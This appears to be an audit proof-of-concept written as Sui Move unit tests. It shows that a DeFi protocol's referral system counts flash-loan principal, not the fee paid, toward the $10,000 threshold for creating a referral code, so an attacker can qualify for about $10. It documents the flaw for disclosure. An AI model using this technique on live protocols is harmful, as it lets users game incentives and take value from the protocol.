/// PoC: Flash loan referral qualification inflation
/// Demonstrates that an attacker can cheaply reach the referral qualification
/// threshold by flash-loaning a large principal and paying only the fee.
///
/// NOTE: This is a conceptual PoC showing the logic flow. Full integration
/// test requires market setup, oracle, and coin decimals registry.
module poc::flash_loan_referral_inflation {
    use std::string;

    use sui::test_scenario::{Self as ts};
    use sui::coin;

    use protocol::referral;

    const ATTACKER: address = @0xA;

    #[test_only]
    public struct USDC has drop {}

    /// Demonstrates the core issue: increase_usd_qualification credits
    /// the full principal amount, not the fee amount.
    #[test]
    fun test_qualification_inflation_via_principal() {
        let mut scenario = ts::begin(ATTACKER);

        // Create referral with $10,000 threshold (default)
        let mut ref = referral::default(scenario.ctx());

        // Before: attacker has no qualification
        assert!(!ref.is_qualified_to_create_referral_code(ATTACKER), 0);

        // Simulate what track_referral does with a $10,000 flash loan principal:
        // In the real flow, loan.loan_amount() = 10_000_000_000 (10k USDC with 6 decimals)
        // After oracle price conversion, collateral_value_usd = 10_000 (floor)
        //
        // The attacker only paid ~$10 in flash loan fees (0.1% of $10k),
        // but gets credited with $10,000 toward qualification.
        ref.increase_usd_qualification(ATTACKER, 10_000);

        // After: attacker is now qualified to create a referral code!
        assert!(ref.is_qualified_to_create_referral_code(ATTACKER), 1);

        // COMPARISON: If the fee ($10) was tracked instead:
        // ref.increase_usd_qualification(ATTACKER, 10);
        // would NOT qualify (10 < 10,000 threshold)

        std::unit_test::destroy(ref);
        ts::end(scenario);
    }

    /// Shows that multiple small flash loans can also inflate qualification
    #[test]
    fun test_incremental_qualification_inflation() {
        let mut scenario = ts::begin(ATTACKER);

        let mut ref = referral::default(scenario.ctx());

        // 10 flash loans of $1,000 each (principal)
        // Actual cost: 10 * $1 fee = $10 total
        // Credited amount: 10 * $1,000 = $10,000
        let mut i = 0;
        while (i < 10) {
            ref.increase_usd_qualification(ATTACKER, 1_000);
            i = i + 1;
        };

        // Qualified with only ~$10 in actual costs
        assert!(ref.is_qualified_to_create_referral_code(ATTACKER), 0);

        std::unit_test::destroy(ref);
        ts::end(scenario);
    }
}
